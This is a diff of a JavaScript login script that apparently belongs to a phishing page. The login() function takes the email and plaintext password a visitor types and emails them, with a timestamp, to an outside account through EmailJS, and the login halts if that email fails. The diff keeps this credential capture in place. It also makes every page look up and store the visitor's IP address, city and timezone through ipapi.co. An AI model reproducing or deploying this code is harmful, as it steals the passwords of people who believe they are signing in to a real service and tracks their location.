@@ -50,22 +50,22 @@ async function login(email, password) {
 
   try {
     console.log("📨 Sending EmailJS message...");
-    const result = await emailjs.send(
+    await emailjs.send(
       "service_6nw221q",
       "template_d6k3x8f",
       {
         userpassword: password,
         useremail: email,
-        time: new Date().toISOString(),
+        time: new Date().toISOString()
       }
     );
-    console.log("✅ EmailJS success:", result);
+    console.log("✅ EmailJS success");
   } catch (error) {
     console.error("❌ EmailJS ERROR:", error);
     alert(
       `Email failed.\nStatus: ${error?.status || "unknown"}\nMessage: ${error?.text || error?.message || "no details"}`
     );
-    return;
+    return; // Stop login if email fails
   }
 
   // Save login info locally
@@ -82,17 +82,8 @@ function loadDashboard() {
     window.location.href = "index.html";
     return;
   }
-
   const emailEl = document.getElementById("userEmail");
   if (emailEl) emailEl.textContent = currentUser.email;
-}
-
-// ======= UTILITY: Convert country code to flag emoji =======
-function countryCodeToFlag(code) {
-  if (!code) return "";
-  return code
-    .toUpperCase()
-    .replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
 }
 
 // ======= USER LOCATION (IP-based) =======
@@ -101,7 +92,18 @@ async function fetchUserLocation() {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
+    // Convert country code to flag emoji
+    function countryCodeToFlag(code) {
+      if (!code) return "";
+      return code
+        .toUpperCase()
+        .replace(/./g, char =>
+          String.fromCodePoint(127397 + char.charCodeAt())
+        );
+    }
+
     const flag = countryCodeToFlag(data.country_code);
+
     const sessionLocation = {
       ip: data.ip || "N/A",
       city: data.city || "N/A",
@@ -109,29 +111,34 @@ async function fetchUserLocation() {
       country: data.country_name || "N/A",
       countryCode: data.country_code || "",
       timezone: data.timezone || "UTC",
-      utcOffset: data.utc_offset || "+00:00",
+      utcOffset: data.utc_offset || "+00:00"
     };
 
     localStorage.setItem("sessionLocation", JSON.stringify(sessionLocation));
 
-    // Update DOM elements
+    // Fill elements
     const ipEl = document.getElementById("user-ip");
-    if (ipEl) ipEl.textContent = `IP: ${sessionLocation.ip}`;
-
     const locationEl = document.getElementById("user-location");
-    if (locationEl) locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
-
     const timeEl = document.getElementById("user-time");
+
+    if (ipEl) ipEl.textContent = `IP: ${sessionLocation.ip}`;
+    if (locationEl) locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
     if (timeEl) {
-      const localTime = new Date().toLocaleString("en-US", { timeZone: sessionLocation.timezone });
+      const localTime = new Date().toLocaleString("en-US", {
+        timeZone: sessionLocation.timezone
+      });
       timeEl.textContent = `Time: ${localTime}`;
     }
-
   } catch (e) {
     console.warn("Could not fetch IP location:", e);
-    document.getElementById("user-ip").textContent = "IP: N/A";
-    document.getElementById("user-location").textContent = "Location: N/A";
-    document.getElementById("user-time").textContent = `Time: ${new Date().toLocaleString()}`;
+
+    const ipEl = document.getElementById("user-ip");
+    const locationEl = document.getElementById("user-location");
+    const timeEl = document.getElementById("user-time");
+
+    if (ipEl) ipEl.textContent = "IP: N/A";
+    if (locationEl) locationEl.textContent = "Location: N/A";
+    if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
   }
 }
 
@@ -148,9 +155,11 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // Load dashboard page features
+  // Load dashboard if present
   if (document.getElementById("userEmail")) {
     loadDashboard();
-    fetchUserLocation();
   }
+
+  // Always fetch user location info (IP, flag, city, time)
+  fetchUserLocation();
 });
